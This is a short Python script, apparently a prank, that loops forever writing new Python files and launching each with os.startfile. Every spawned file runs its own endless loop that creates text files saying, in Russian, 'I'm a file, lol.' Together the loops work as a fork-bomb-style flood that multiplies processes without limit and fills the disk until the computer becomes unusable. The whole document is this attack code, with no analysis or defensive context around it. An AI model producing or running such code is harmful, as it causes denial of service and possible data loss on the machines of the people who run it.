import os
a=0
while True:
    with open(f"SpamProgram{a}.py", "w+",  encoding="utf-8") as s:
        s.write(f"""a=0
while True:
    with open(f"{a}SpamFile"""+"{a}"+f""".txt", "w+", encoding="utf-8") as s:
        s.write("Я файл, лол.")
        a+=1""")
    os.startfile(f"SpamProgram{a}.py")
    a+=1
